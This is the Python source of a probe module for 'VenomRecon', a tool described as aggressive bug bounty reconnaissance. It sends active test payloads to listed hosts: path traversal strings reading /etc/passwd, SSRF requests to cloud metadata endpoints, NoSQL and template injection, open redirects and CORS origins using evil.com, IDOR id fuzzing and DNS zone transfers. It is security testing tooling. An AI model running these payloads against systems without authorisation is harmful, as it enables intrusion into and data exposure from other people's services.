"""
utils/probes.py – Aggressive bug bounty recon probe suite (VenomRecon v1.0)
"""

from __future__ import annotations

import base64
import json
import os
import re
import socket
import ssl
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import List, Optional

# Data model

@dataclass
class Finding:
    check_name: str
    url: str
    severity: str
    evidence: str
    verified: bool = False


# Globals

_UNVERIFIED_CTX = ssl._create_unverified_context()
_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

_NOISE_DOMAINS = {
    "googleapis.com", "cloudflare.com", "amazonaws.com",
    "fastly.net", "akamaiedge.net", "googletagmanager.com",
    "google-analytics.com", "facebook.com", "twitter.com",
}


# Core helpers

def _load_lines(path: str) -> List[str]:
    if not os.path.isfile(path):
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return [l.strip() for l in fh if l.strip()]


def _write_findings(findings: List[Finding], outfile: str) -> None:
    if not findings:
        return
    os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
    with open(outfile, "a", encoding="utf-8", newline="\n") as fh:
        for f in findings:
            status = "[VERIFIED]" if f.verified else ""
            fh.write(f"[{f.severity.upper()}]{status} [{f.check_name}] {f.url} | {f.evidence}\n")


def _get(
    url: str,
    timeout: int = 10,
    headers: Optional[dict] = None,
    method: str = "GET",
    data: Optional[bytes] = None,
) -> tuple[int, dict, str]:
    try:
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", _UA)

        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        with urllib.request.urlopen(req, timeout=timeout, context=_UNVERIFIED_CTX) as resp:
            return resp.status, dict(resp.headers), resp.read(4096).decode("utf-8", errors="ignore")

    except urllib.error.HTTPError as e:
        try:
            body = e.read(2048).decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return e.code, dict(e.headers), body

    except Exception:
        return -1, {}, ""


def _ensure_scheme(host: str) -> str:
    if host.startswith(("http://", "https://")):
        return host.rstrip("/")
    return f"https://{host.rstrip('/')}"


# GraphQL

GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/graphql/v1",
    "/graphiql", "/playground", "/api/v1/graphql"
]


def probe_graphql_native(hosts_file: str, outdir: str) -> None:
    found = []
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        for path in GRAPHQL_PATHS:
            code, _, body = _get(f"{base}{path}", timeout=8)
            if code in (200, 400) and ("graphql" in body.lower() or "__schema" in body):
                found.append(f"{base}{path}")

    outfile = os.path.join(outdir, "graphql_endpoints.txt")
    with open(outfile, "a", encoding="utf-8") as fh:
        fh.write("\n".join(found) + ("\n" if found else ""))


def graphql_introspection_probe(endpoints_file: str, outfile: str) -> List[Finding]:
    findings = []
    payload = json.dumps({"query": "{__schema{types{name}}}"}).encode()

    for ep in _load_lines(endpoints_file):
        code, _, body = _get(
            ep,
            timeout=10,
            headers={"Content-Type": "application/json"},
            method="POST",
            data=payload,
        )

        if code == 200 and "__Schema" in body:
            findings.append(Finding(
                "graphql_introspection",
                ep,
                "medium",
                "Introspection enabled (GRAPHQL EXPOSED)",
                True
            ))

    _write_findings(findings, outfile)
    return findings


def graphql_batch_probe(endpoints_file: str, outfile: str) -> List[Finding]:
    findings = []
    payload = json.dumps([
        {"query": "{__typename}"},
        {"query": "{__typename}"}
    ]).encode()

    for ep in _load_lines(endpoints_file):
        code, _, body = _get(
            ep,
            timeout=10,
            headers={"Content-Type": "application/json"},
            method="POST",
            data=payload,
        )

        if code == 200 and body.strip().startswith("["):
            findings.append(Finding(
                "graphql_batch",
                ep,
                "low",
                "Batch queries accepted (possible abuse surface)",
                True
            ))

    _write_findings(findings, outfile)
    return findings


# API probing 

API_PATHS = [
    "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    "/api", "/rest",
    "/api/latest", "/api/internal", "/api/dev"
]


def probe_api_versions_native(hosts_file: str, outdir: str) -> None:
    found = []
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        for path in API_PATHS:
            code, _, _ = _get(f"{base}{path}", timeout=7)
            if code in (200, 401, 403):
                found.append(f"{base}{path} [{code}]")

    outfile = os.path.join(outdir, "api_version_endpoints.txt")
    with open(outfile, "a", encoding="utf-8", newline="\n") as fh:
        fh.write("\n".join(found) + ("\n" if found else ""))


# WebSocket detection

def probe_websocket_native(urls_file: str, outdir: str) -> None:
    ws_re = re.compile(r'(wss?://[\w./:@\-?=#&%+]+)', re.IGNORECASE)
    found = set()

    for line in _load_lines(urls_file):
        found.update(ws_re.findall(line))

    outfile = os.path.join(outdir, "websocket_endpoints.txt")
    with open(outfile, "w", encoding="utf-8") as fh:
        fh.write("\n".join(sorted(found)) + ("\n" if found else ""))


# Favicon hashing (Shodan chain preserved)

def _mmh3_hash(data: bytes) -> Optional[str]:
    try:
        import mmh3
        return str(mmh3.hash(base64.b64encode(data)))
    except ImportError:
        return None


def collect_favicon_hashes(hosts_file: str, outfile: str) -> None:
    lines = []
    warned = False

    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        try:
            req = urllib.request.Request(f"{base}/favicon.ico")
            req.add_header("User-Agent", _UA)

            with urllib.request.urlopen(req, timeout=8, context=_UNVERIFIED_CTX) as resp:
                data = resp.read()

            h = _mmh3_hash(data)
            if h:
                lines.append(f"{host} {h}")
            elif not warned:
                warned = True

        except Exception:
            continue

    os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
    with open(outfile, "a", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + ("\n" if lines else ""))

# Security headers (intentionally noisy)

SECURITY_HEADERS = [
    ("strict-transport-security", "medium", "Missing HSTS"),
    ("x-frame-options", "low", "Missing XFO"),
    ("x-content-type-options", "low", "Missing XCTO"),
    ("content-security-policy", "medium", "Missing CSP"),
    ("permissions-policy", "low", "Missing PP"),
    ("referrer-policy", "low", "Missing RP"),
]


def security_headers_audit(hosts_file: str, outfile: str) -> List[Finding]:
    findings = []

    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        code, headers, _ = _get(base, timeout=10)

        if code < 0:
            continue

        lower = {k.lower(): v for k, v in headers.items()}

        for h, sev, desc in SECURITY_HEADERS:
            if h not in lower:
                findings.append(Finding("security_headers", base, sev, desc))

    _write_findings(findings, outfile)
    return findings
# 7. TLS audit

def tls_audit_native(hosts_file: str, outfile: str) -> List[Finding]:
    """Check for expired certs, self-signed, TLS < 1.2, missing HSTS."""
    import datetime
    findings = []
    for host in _load_lines(hosts_file):
        hostname = host.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    proto = ssock.version()
                    not_after = cert.get("notAfter", "")
                    if not_after:
                        # FIX-3: datetime.utcnow() is deprecated in Python 3.12+ and
                        # produces a naive datetime that can behave incorrectly across
                        # DST boundaries or when the system clock is in a non-UTC zone.
                        # Parse the cert timestamp as UTC and compare against an
                        # explicit timezone-aware datetime.now(UTC) instead.
                        exp = datetime.datetime.strptime(not_after, "%b %d %H:%M:%S %Y GMT")
                        exp = exp.replace(tzinfo=datetime.timezone.utc)
                        now = datetime.datetime.now(datetime.timezone.utc)
                        if exp < now:
                            findings.append(Finding("tls_audit", host, "high",
                                                    f"Certificate expired on {not_after}"))
                    if proto and proto not in ("TLSv1.2", "TLSv1.3"):
                        findings.append(Finding("tls_audit", host, "medium",
                                                f"Weak TLS version: {proto}"))
        except ssl.SSLCertVerificationError as e:
            if "self signed" in str(e).lower() or "self-signed" in str(e).lower():
                findings.append(Finding("tls_audit", host, "medium", "Self-signed certificate detected"))
        except Exception:
            pass
    _write_findings(findings, outfile)
    return findings


# 8. Email security: SPF / DMARC / DKIM

def _dns_txt(domain: str, timeout: int = 8) -> List[str]:
    """Resolve DNS TXT records for domain using socket/stdlib."""
    import shutil
    if not shutil.which("dig"):
        return []
    import subprocess
    try:
        result = subprocess.run(
            ["dig", "+short", "TXT", domain],
            capture_output=True, text=True, timeout=timeout
        )
        return [l.strip().strip('"') for l in result.stdout.splitlines() if l.strip()]
    except Exception:
        return []


def check_spf_record(domain: str, outfile: str) -> List[Finding]:
    """Check SPF DNS TXT record. Finding if missing or +all (permissive)."""
    findings = []
    records = _dns_txt(domain)
    spf_records = [r for r in records if r.startswith("v=spf1")]
    if not spf_records:
        findings.append(Finding("spf_check", domain, "medium", "No SPF record found"))
    else:
        for rec in spf_records:
            if "+all" in rec:
                findings.append(Finding("spf_check", domain, "high",
                                        f"Permissive SPF: {rec[:120]}"))
    _write_findings(findings, outfile)
    return findings


def check_dmarc_record(domain: str, outfile: str) -> List[Finding]:
    """Check DMARC record. Finding if missing or p=none."""
    findings = []
    records = _dns_txt(f"_dmarc.{domain.strip()}")
    dmarc = [r for r in records if r.startswith("v=DMARC1")]
    if not dmarc:
        findings.append(Finding("dmarc_check", domain, "medium", "No DMARC record found"))
    else:
        for rec in dmarc:
            if "p=none" in rec:
                findings.append(Finding("dmarc_check", domain, "medium",
                                        f"DMARC policy is p=none (no enforcement): {rec[:120]}"))
    _write_findings(findings, outfile)
    return findings


DKIM_SELECTORS = ["default", "google", "mail", "k1", "s1", "s2", "dkim", "selector1", "selector2"]


def check_dkim_record(domain: str, outfile: str) -> List[Finding]:
    """Check common DKIM selectors. Informational finding if none found."""
    findings = []
    found_any = False
    for selector in DKIM_SELECTORS:
        records = _dns_txt(f"{selector}._domainkey.{domain}")
        if any("v=DKIM1" in r for r in records):
            found_any = True
            break
    if not found_any:
        findings.append(Finding("dkim_check", domain, "low",
                                "No DKIM selector TXT records found for common selectors"))
    _write_findings(findings, outfile)
    return findings


# 9. DNS zone transfer

def attempt_zone_transfer(subdomains_file: str, outfile: str,
                          root_domain: str = "") -> List[Finding]:
    """For the root domain, attempt AXFR on each NS record."""
    import subprocess
    findings = []
    domains = _load_lines(subdomains_file)
    if not domains and not root_domain:
        return findings

    root = root_domain.lstrip("*.") if root_domain else (domains[0] if domains else "")
    if not root:
        return findings

    try:
        ns_result = subprocess.run(
            ["dig", "+short", "NS", root],
            capture_output=True, text=True, timeout=10
        )
        nameservers = [l.strip().rstrip(".") for l in ns_result.stdout.splitlines() if l.strip()]
    except Exception:
        nameservers = []

    for ns in nameservers:
        try:
            axfr = subprocess.run(
                ["dig", "AXFR", root, f"@{ns}"],
                capture_output=True, text=True, timeout=15
            )
            if "XFR size" in axfr.stdout and len(axfr.stdout.strip()) > 100:
                findings.append(Finding("zone_transfer", root, "high",
                                        f"Zone transfer succeeded via {ns}", verified=True))
                with open(outfile, "a", encoding="utf-8", newline="\n") as fh:
                    fh.write(f"=== AXFR from {ns} ===\n{axfr.stdout}\n")
        except Exception:
            pass

    _write_findings(findings, outfile)
    return findings


def check_dnssec(domain: str, outfile: str) -> List[Finding]:
    """Check if DNSSEC is configured (DNSKEY present). Informational if missing."""
    import subprocess
    findings = []
    try:
        result = subprocess.run(
            ["dig", "+short", "DNSKEY", domain],
            capture_output=True, text=True, timeout=8
        )
        if "DNSKEY" not in result.stdout:
            findings.append(Finding("dnssec_check", domain, "info",
                                    "DNSSEC not configured (no DNSKEY records)"))
    except Exception:
        pass
    _write_findings(findings, outfile)
    return findings


# 10. CORS native probe

def cors_native_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Test CORS with evil.com, null, and reflective origins."""
    findings = []
    test_origins = ["https://evil.com", "null", "https://attacker.evil.com"]
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        for origin in test_origins:
            code, resp_headers, _ = _get(base, timeout=8, headers={"Origin": origin})
            acao = resp_headers.get("Access-Control-Allow-Origin", "") or resp_headers.get("access-control-allow-origin", "")
            acac = resp_headers.get("Access-Control-Allow-Credentials", "") or resp_headers.get("access-control-allow-credentials", "")
            if acao in (origin, "*") and acac.lower() == "true":
                findings.append(Finding("cors_native", base, "high",
                                        f"CORS misconfiguration: ACAO={acao} ACAC={acac} Origin={origin}",
                                        verified=True))
            elif acao == origin:
                findings.append(Finding("cors_native", base, "medium",
                                        f"CORS reflects arbitrary origin: ACAO={acao}"))
    _write_findings(findings, outfile)
    return findings


# 11. Host header injection

def host_header_injection_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Inject evil Host header and check for reflection or redirect."""
    findings = []
    evil = "evil-attacker-venomrecon.com"
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        code, resp_headers, body = _get(base, timeout=8,
                                        headers={"Host": evil, "X-Forwarded-Host": evil})
        location = resp_headers.get("Location", "") or resp_headers.get("location", "")
        if evil in body or evil in location:
            findings.append(Finding("host_header_injection", base, "medium",
                                    f"Host header reflected in response: evil={evil}", verified=True))
    _write_findings(findings, outfile)
    return findings


# 12. NoSQL injection native probe

def nosqli_native_probe(params_file: str, outfile: str) -> List[Finding]:
    """Inject NoSQL operators into query parameters."""
    findings = []
    payloads = ["[$ne]=1", "[$gt]=", "%7B%22%24gt%22%3A%22%22%7D"]
    for url in _load_lines(params_file):
        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        for payload in payloads:
            new_qsl = [(k, payload) for k, _ in qsl]
            test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
            code, _, body = _get(test_url, timeout=8)
            if code == 200 and len(body) > 300:
                findings.append(Finding("nosqli_native", url, "high",
                                        f"Possible NoSQL injection: payload={payload[:30]} status={code}"))
                break
    _write_findings(findings, outfile)
    return findings


# 13. Path traversal probes

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "/etc/passwd",
]
LFI_ENCODED_PAYLOADS = [
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]
LFI_WINDOWS_PAYLOADS = [
    "..\\..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",
    "/windows/win.ini",
]
LFI_MARKERS = ["root:x:", "[fonts]", "[boot loader]"]


def _lfi_check(params_file: str, payloads: list[str], outfile: str, check_name: str) -> List[Finding]:
    findings = []
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        for payload in payloads:
            new_qsl = [(k, payload) for k, _ in qsl]
            test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
            _, _, body = _get(test_url, timeout=8)
            if any(marker in body for marker in LFI_MARKERS):
                findings.append(Finding(check_name, url, "high",
                                        f"LFI confirmed: payload={payload[:60]}", verified=True))
                break
    _write_findings(findings, outfile)
    return findings


def lfi_basic_probe(params_file: str, outfile: str) -> List[Finding]:
    return _lfi_check(params_file, LFI_PAYLOADS, outfile, "lfi_basic")


def path_traversal_probe(params_file: str, outfile: str) -> List[Finding]:
    return _lfi_check(params_file, LFI_PAYLOADS + LFI_WINDOWS_PAYLOADS, outfile, "path_traversal")


def lfi_encoded_probe(params_file: str, outfile: str) -> List[Finding]:
    return _lfi_check(params_file, LFI_ENCODED_PAYLOADS, outfile, "lfi_encoded")


# 14. SSRF probes

def ssrf_oob_probe(params_file: str, interactsh_host: str, outfile: str) -> List[Finding]:
    """Replace param values with OOB interactsh URL and fire requests."""
    findings = []
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        for idx, (k, _) in enumerate(qsl):
            oob_url = f"http://{interactsh_host}/ssrf-{k}-venomrecon"
            new_qsl = list(qsl)
            new_qsl[idx] = (k, oob_url)
            test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
            _get(test_url, timeout=5)
        findings.append(Finding("ssrf_oob", url, "info",
                                f"OOB probe sent (no verification performed): {interactsh_host}"))
    _write_findings(findings, outfile)
    return findings


IMDS_URLS = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-01-01",
    "do": "http://169.254.169.254/metadata/v1/",
}
IMDS_MARKERS = {
    "aws": ["ami-id", "instance-id", "hostname"],
    "gcp": ["project", "instance", "zone"],
    "azure": ["compute", "location", "vmId"],
    "do": ["droplet_id", "region"],
}


def ssrf_metadata_probe(params_file: str, metadata_url: str, outfile: str) -> List[Finding]:
    """Replace param values with IMDS endpoint URL. Check for metadata in response."""
    findings = []
    provider = next((k for k, v in IMDS_URLS.items() if metadata_url.startswith(v)), "unknown")
    markers = IMDS_MARKERS.get(provider, [])
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        new_qsl = [(k, metadata_url) for k, _ in qsl]
        test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
        _, _, body = _get(test_url, timeout=8)
        if markers and any(m in body for m in markers):
            findings.append(Finding("ssrf_metadata", url, "critical",
                                    f"SSRF to {provider} IMDS: metadata returned", verified=True))
    _write_findings(findings, outfile)
    return findings


# 15. Open redirect probe

REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "https:evil.com",
    "//\\evil.com",
    "%2F%2Fevil.com",
]


def open_redirect_probe(params_file: str, outfile: str) -> List[Finding]:
    """Test open redirect payloads in redirect-classified params."""
    findings = []
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        for payload in REDIRECT_PAYLOADS:
            new_qsl = [(k, payload) for k, _ in qsl]
            test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
            code, resp_headers, _ = _get(test_url, timeout=8)
            location = resp_headers.get("Location", "") or resp_headers.get("location", "")
            if code in (301, 302, 303, 307, 308) and "evil.com" in location:
                findings.append(Finding("open_redirect", url, "medium",
                                        f"Redirect to {location} via payload={payload}", verified=True))
                break
    _write_findings(findings, outfile)
    return findings


# 16. SSTI native probe

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
]


def ssti_native_probe(params_file: str, outfile: str) -> List[Finding]:
    """Test SSTI payloads. Finding if 49 appears in response."""
    findings = []
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        for payload, expected in SSTI_PAYLOADS:
            new_qsl = [(k, payload) for k, _ in qsl]
            test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
            _, _, body = _get(test_url, timeout=8)
            if expected in body:
                findings.append(Finding("ssti_native", url, "high",
                                        f"SSTI confirmed: payload={payload!r} response contains {expected}",
                                        verified=True))
                break
    _write_findings(findings, outfile)
    return findings


# 17. Native reflection check

def native_reflection_check(params_file: str, outfile: str) -> List[Finding]:
    """Send unique canary token in each param, check if it reflects."""
    import uuid
    findings = []
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        if not qsl:
            continue
        canary = f"venom{uuid.uuid4().hex[:8]}"
        new_qsl = [(k, canary) for k, _ in qsl]
        test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
        _, _, body = _get(test_url, timeout=8)
        if canary in body:
            findings.append(Finding("reflection_check", url, "info",
                                    f"Parameter values reflected in response (canary={canary})"))
    _write_findings(findings, outfile)
    return findings


# 18. Spring Boot actuator probe

ACTUATOR_PATHS = [
    "/actuator", "/actuator/env", "/actuator/mappings",
    "/actuator/health", "/actuator/dump", "/actuator/trace",
    "/actuator/beans", "/actuator/configprops", "/actuator/loggers",
    "/manage/health", "/management/health",
]


def spring_actuator_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Probe Spring Boot actuator endpoints."""
    findings = []
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        for path in ACTUATOR_PATHS:
            code, _, body = _get(f"{base}{path}", timeout=8)
            if code == 200 and len(body) > 20:
                sev = "high" if path in ("/actuator/env", "/actuator/dump", "/actuator/trace") else "medium"
                findings.append(Finding("spring_actuator", f"{base}{path}", sev,
                                        f"Actuator endpoint exposed ({len(body)} bytes)", verified=True))
    _write_findings(findings, outfile)
    return findings


# 19. Cache deception probe

def cache_deception_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Append static suffixes to see if sensitive content gets cached."""
    findings = []
    suffixes = ["/profile.css", "/account.js", "/dashboard.jpg", "/settings.png"]
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        orig_code, _, orig_body = _get(base, timeout=8)
        if orig_code < 0 or len(orig_body) < 50:
            continue
        for suffix in suffixes:
            code, resp_headers, body = _get(f"{base}{suffix}", timeout=8)
            cache_ctrl = resp_headers.get("Cache-Control", "") or resp_headers.get("cache-control", "")
            if code == 200 and len(body) > 200 and "public" in cache_ctrl.lower():
                findings.append(Finding("cache_deception", f"{base}{suffix}", "medium",
                                        f"Possible cache deception: Cache-Control: {cache_ctrl}"))
    _write_findings(findings, outfile)
    return findings


# 20. H2C smuggling probe

def h2c_smuggling_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Probe for HTTP/2 cleartext upgrade acceptance."""
    findings = []
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        code, resp_headers, _ = _get(
            base, timeout=8,
            headers={"Upgrade": "h2c", "HTTP2-Settings": "AAMAAABkAAQAAP__",
                     "Connection": "Upgrade, HTTP2-Settings"}
        )
        upgrade_hdr = resp_headers.get("Upgrade", "") or resp_headers.get("upgrade", "")
        if code == 101 or "h2c" in upgrade_hdr.lower():
            findings.append(Finding("h2c_smuggling", base, "medium",
                                    "Host accepted h2c upgrade request", verified=True))
    _write_findings(findings, outfile)
    return findings


# 21. Error disclosure probe

ERROR_MARKERS = [
    "traceback", "stack trace", "exception in thread", "at org.springframework",
    "sqlstate", "odbc", "jdbc", "ora-", "mysql_fetch", "pg_query",
    "undefined method", "nomethoderror", "syntaxerror", "valueerror",
]


def error_disclosure_probe(hosts_file: str, outfile: str) -> List[Finding]:
    """Send malformed requests and check for stack traces in responses."""
    findings = []
    for host in _load_lines(hosts_file):
        base = _ensure_scheme(host)
        _, _, body = _get(base, timeout=8,
                          headers={"Content-Type": "application/x-venomrecon-invalid"},
                          method="POST", data=b"A" * 512)
        body_lower = body.lower()
        for marker in ERROR_MARKERS:
            if marker in body_lower:
                findings.append(Finding("error_disclosure", base, "low",
                                        f"Stack trace/error disclosure: marker={marker!r}"))
                break
    _write_findings(findings, outfile)
    return findings


# 22. Broken link hijacking

def broken_link_hijack_check(urls_file: str, outfile: str) -> List[Finding]:
    """Find external links where the domain is unregistered (NXDOMAIN)."""
    findings = []
    ext_re = re.compile(r'https?://([\w.-]+)', re.IGNORECASE)
    checked: set = set()

    for line in _load_lines(urls_file):
        for m in ext_re.finditer(line):
            domain = m.group(1).lower()
            if domain in checked:
                continue
            checked.add(domain)
            if "." in domain and not domain.replace(".", "").isdigit():
                if not any(noise in domain for noise in _NOISE_DOMAINS):
                    try:
                        socket.gethostbyname(domain)
                    except socket.gaierror:
                        findings.append(Finding("broken_link_hijack", line, "medium",
                                                f"Unregistered domain in outbound link: {domain}"))
            if len(checked) > 200:
                _write_findings(findings, outfile)
                return findings

    _write_findings(findings, outfile)
    return findings


# 23. IDOR ID fuzz probe

def idor_id_fuzz_probe(params_file: str, outfile: str) -> List[Finding]:
    """For id/user_id/account_id params, try id+1, id-1, id=0."""
    findings = []
    id_params = re.compile(r'^(id|user_id|account_id|uid|userid|pid|order_id)$', re.I)
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    for url in _load_lines(params_file):
        parsed = urlparse(url)
        qsl = parse_qsl(parsed.query, keep_blank_values=True)
        for k, v in qsl:
            if not id_params.match(k):
                continue
            try:
                base_val = int(v)
            except ValueError:
                continue
            _, _, orig_body = _get(url, timeout=8)
            orig_len = len(orig_body)
            for probe_val in (base_val + 1, base_val - 1, 0):
                new_qsl = [(pk, str(probe_val) if pk == k else pv) for pk, pv in qsl]
                test_url = urlunparse(parsed._replace(query=urlencode(new_qsl)))
                code, _, body = _get(test_url, timeout=8)
                delta = abs(len(body) - orig_len)
                if code == 200 and orig_len > 100 and delta / orig_len > 0.6:
                    findings.append(Finding("idor_id_fuzz", url, "medium",
                                            f"IDOR candidate: param={k} probe={probe_val} delta={delta}"))
                    break
    _write_findings(findings, outfile)
    return findings


# 24. WordPress target detection

def detect_wordpress_targets(httpx_json: str, outfile: str) -> None:
    """Parse httpx tech-detect JSON. Extract hosts where tech includes WordPress."""
    found = []
    if not os.path.isfile(httpx_json):
        return
    with open(httpx_json, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            try:
                data = json.loads(line)
                techs = data.get("tech") or data.get("technologies") or []
                if any("wordpress" in str(t).lower() for t in techs):
                    url = data.get("url", "") or data.get("input", "")
                    if url:
                        found.append(url)
            except Exception:
                pass
    os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
    with open(outfile, "w", encoding="utf-8") as fh:
        fh.write("\n".join(found) + ("\n" if found else ""))


# 25. RapidDNS and LeakIX passive scrapers

def fetch_rapiddns(domain: str, outfile: str) -> None:
    """Fetch subdomains from rapiddns.io."""
    try:
        url = f"https://rapiddns.io/subdomain/{domain}?full=1&down=1"
        req = urllib.request.Request(url, headers={"User-Agent": _UA})
        with urllib.request.urlopen(req, timeout=30, context=_UNVERIFIED_CTX) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
        pattern = re.compile(
            r'([a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+' + re.escape(domain),
            re.IGNORECASE
        )
        subs = sorted({m.group(0).lower() for m in pattern.finditer(content)})
        os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
        with open(outfile, "w", encoding="utf-8") as fh:
            fh.write("\n".join(subs) + ("\n" if subs else ""))
    except Exception:
        pass


def fetch_leakix(domain: str, outfile: str) -> None:
    """Fetch subdomains from LeakIX API (requires LEAKIX_API_KEY)."""
    from core.config import config
    if not config.leakix_api_key:
        return
    try:
        url = f"https://leakix.net/api/subdomains/{domain}"
        req = urllib.request.Request(url, headers={
            "User-Agent": _UA,
            "api-key": config.leakix_api_key,
        })
        with urllib.request.urlopen(req, timeout=30, context=_UNVERIFIED_CTX) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="ignore"))
        subs = sorted({item.get("subdomain", "").lower() for item in data if item.get("subdomain")})
        os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
        with open(outfile, "w", encoding="utf-8") as fh:
            fh.write("\n".join(subs) + ("\n" if subs else ""))
    except Exception:
        pass
